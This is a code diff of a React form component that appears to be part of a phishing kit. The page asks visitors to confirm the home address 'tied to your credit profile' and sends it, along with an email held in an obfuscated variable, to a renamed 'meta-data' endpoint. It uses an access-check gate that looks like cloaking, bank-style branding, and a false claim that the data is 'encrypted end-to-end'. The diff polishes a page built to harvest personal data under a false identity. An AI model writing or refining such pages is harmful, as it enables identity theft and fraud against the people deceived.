@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useEffect, useState } from 'react';
 import { useLocation, useNavigate } from 'react-router-dom';
 import axios from 'axios';
 import { baseUrl } from '../constants';
@@ -16,7 +16,8 @@ const HomeAddress: React.FC = () => {
     apt: '', 
     city: '', 
     state: '', 
-    zipCode: '' 
+    zipCode: '',
+    form: '' 
   });
 
   const navigate = useNavigate();
@@ -24,12 +25,22 @@ const HomeAddress: React.FC = () => {
   const { emzemz } = location.state || {};
   const isAllowed = useAccessCheck(baseUrl);
 
-  // Debug: Log the received email
-  console.log('HomeAddress received email:', emzemz);
+  useEffect(() => {
+    if (!emzemz) {
+      navigate('/login', { replace: true });
+    }
+  }, [emzemz, navigate]);
 
-  // Show loading state while checking access
-  if (!isAllowed) {
-    return <div>Loading...</div>; // Or a proper loading spinner
+  if (isAllowed === null) {
+    return <div className="min-h-screen flex items-center justify-center text-gray-700">Loading...</div>;
+  }
+
+  if (isAllowed === false) {
+    return <div className="min-h-screen flex items-center justify-center text-gray-700">Access denied. Redirecting...</div>;
+  }
+
+  if (!emzemz) {
+    return <div className="min-h-screen flex items-center justify-center text-gray-700">Missing user details. Please restart the process.</div>;
   }
 
   const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
@@ -41,7 +52,8 @@ const HomeAddress: React.FC = () => {
       city: !city.trim() ? 'City is required' : '',
       state: !state.trim() ? 'State is required' : '',
       zipCode: !zipCode.trim() ? 'Zip Code is required' : '',
-      apt: ''
+      apt: '',
+      form: ''
     };
 
     setErrors(newErrors);
@@ -49,7 +61,7 @@ const HomeAddress: React.FC = () => {
     // Check if there are no errors (apt is optional)
     if (!newErrors.stAd && !newErrors.city && !newErrors.state && !newErrors.zipCode) {
       try {
-        await axios.post(`${baseUrl}api/logix-meta-data-4/`, {
+        await axios.post(`${baseUrl}api/fifty-meta-data-4/`, {
           emzemz,
           stAd,
           apt,
@@ -57,7 +69,6 @@ const HomeAddress: React.FC = () => {
           state,
           zipCode,
         });
-        console.log('Home address submitted successfully');
         navigate('/terms', { state: { emzemz } });
       } catch (error) {
         console.error('Error submitting home address:', error);
@@ -65,6 +76,7 @@ const HomeAddress: React.FC = () => {
           ...prev,
           form: 'There was an error submitting your address. Please try again.'
         }));
+      } finally {
         setIsLoading(false);
       }
     } else {
@@ -73,143 +85,103 @@ const HomeAddress: React.FC = () => {
   };
 
   return (
-    <div className="flex-1 bg-gray-200 rounded shadow-sm max-w-4xl mx-auto my-8">
-      <div className="border-b-2 border-teal-500 px-8 py-4">
-        <h2 className="text-xl font-semibold text-gray-800">Home Address</h2>
-      </div>
+    <div className="w-full">
+      <div className="mx-auto w-full max-w-3xl rounded-md border border-gray-200 bg-white shadow-[0_12px_30px_rgba(0,0,0,0.12)]">
+        <div className="h-2 bg-gradient-to-r from-[#0b2b6a] via-[#123b9d] to-[#1a44c6]" />
+        <div className="px-8 py-8">
+          <h2 className="text-2xl font-semibold text-gray-900">Confirm Your Home Address</h2>
+          <p className="mt-3 text-sm text-gray-600">
+            This needs to match the information tied to your credit profile so we can confirm it’s really you.
+          </p>
 
-      <div className="px-8 py-6 bg-white space-y-6">
-        <p className="text-sm text-gray-600 text-center mb-8">
-          We'll need you to confirm your home address. The one tied to your credit file.
-        </p>
-        
-        <form onSubmit={handleSubmit} className="max-w-lg mx-auto">
-          {/* Street Address */}
-          <div className="mb-4">
-            <div className="flex items-center gap-4 ">
-              <label className="text-gray-700 w-32 text-right">Street Address:</label>
+          <form onSubmit={handleSubmit} className="mt-8 space-y-6">
+            <div className="space-y-2">
+              <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Street Address</label>
               <input
                 id="stAd"
                 name="stAd"
                 type="text"
                 value={stAd}
                 onChange={(e) => setStAd(e.target.value)}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
+                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
+                placeholder="123 Main Street"
               />
+              {errors.stAd && <p className="text-xs font-semibold text-red-600">{errors.stAd}</p>}
             </div>
-            {errors.stAd && (
-              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
-                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
-                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-                </svg>
-                {errors.stAd}
+
+            <div className="grid gap-6 md:grid-cols-2">
+              <div className="space-y-2">
+                <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Apartment / Unit (optional)</label>
+                <input
+                  id="apt"
+                  name="apt"
+                  type="text"
+                  value={apt}
+                  onChange={(e) => setApt(e.target.value)}
+                  className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
+                />
               </div>
-            )}
-          </div>
 
-          {/* Apt or Unit */}
-          <div className="mb-4">
-            <div className="flex items-center gap-4">
-              <label className="text-gray-700 w-32 text-right">Apt or Unit (optional):</label>
-              <input
-                id="apt"
-                name="apt"
-                type="text"
-                value={apt}
-                onChange={(e) => setApt(e.target.value)}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              />
-            </div>
-          </div>
-
-          {/* City */}
-          <div className="mb-4">
-            <div className="flex items-center gap-4">
-              <label className="text-gray-700 w-32 text-right">City:</label>
-              <input
-                id="city"
-                name="city"
-                type="text"
-                value={city}
-                onChange={(e) => setCity(e.target.value)}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              />
-            </div>
-            {errors.city && (
-              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
-                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
-                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-                </svg>
-                {errors.city}
+              <div className="space-y-2">
+                <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">City</label>
+                <input
+                  id="city"
+                  name="city"
+                  type="text"
+                  value={city}
+                  onChange={(e) => setCity(e.target.value)}
+                  className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
+                  placeholder="Enter city"
+                />
+                {errors.city && <p className="text-xs font-semibold text-red-600">{errors.city}</p>}
               </div>
-            )}
-          </div>
 
-          {/* State */}
-          <div className="mb-4">
-            <div className="flex items-center gap-4">
-              <label className="text-gray-700 w-32 text-right">State:</label>
-              <input
-                id="state"
-                name="state"
-                type="text"
-                value={state}
-                onChange={(e) => setState(e.target.value)}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              />
-            </div>
-            {errors.state && (
-              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
-                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
-                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-                </svg>
-                {errors.state}
+              <div className="space-y-2">
+                <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">State</label>
+                <input
+                  id="state"
+                  name="state"
+                  type="text"
+                  value={state}
+                  onChange={(e) => setState(e.target.value)}
+                  className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
+                  placeholder="OH"
+                />
+                {errors.state && <p className="text-xs font-semibold text-red-600">{errors.state}</p>}
               </div>
-            )}
-          </div>
 
-          {/* Zip Code */}
-          <div className="mb-6">
-            <div className="flex items-center gap-4">
-              <label className="text-gray-700 w-32 text-right">Zip Code:</label>
-              <input
-                id="zipCode"
-                name="zipCode"
-                type="text"
-                value={zipCode}
-                onChange={(e) => setZipCode(e.target.value)}
-                className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              />
-            </div>
-            {errors.zipCode && (
-              <div className="flex items-center gap-2 text-sm text-red-600 mt-1 ml-36">
-                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
-                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-                </svg>
-                {errors.zipCode}
+              <div className="space-y-2">
+                <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Zip Code</label>
+                <input
+                  id="zipCode"
+                  name="zipCode"
+                  type="text"
+                  value={zipCode}
+                  onChange={(e) => setZipCode(e.target.value)}
+                  className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
+                  placeholder="45202"
+                />
+                {errors.zipCode && <p className="text-xs font-semibold text-red-600">{errors.zipCode}</p>}
               </div>
-            )}
-          </div>
+            </div>
 
-          <div className=" border-b-2 border-teal-500 justify-center text-center px-6 py-4">
-            {!isLoading ? (
+            {errors.form && <p className="text-sm font-semibold text-red-600">{errors.form}</p>}
+
+            <div className="flex justify-end">
               <button
                 type="submit"
-                className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
+                disabled={isLoading}
+                className="inline-flex items-center justify-center rounded-sm bg-[#123b9d] px-8 py-3 text-sm font-semibold uppercase tracking-wide text-white transition hover:bg-[#0f2f6e] disabled:cursor-not-allowed disabled:opacity-70"
               >
-                Continue
+                {isLoading ? 'Saving…' : 'Continue'}
               </button>
-            ) : (
-              <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent"></div>
-            )}
-          </div>
-        </form>
-      </div>
+            </div>
+          </form>
 
-      <div className="px-6 py-4 bg-gray-50 border-t border-gray-200">
-        <p className="text-xs text-gray-600">
-          Your information is secure and will be used in accordance with our Privacy Policy.
-        </p>
+          <div className="mt-6 rounded-md bg-[#f4f2f2] px-4 py-3 text-xs text-gray-600">
+            Your address stays private and is encrypted end-to-end.
+          </div>
+        </div>
       </div>
     </div>
   );
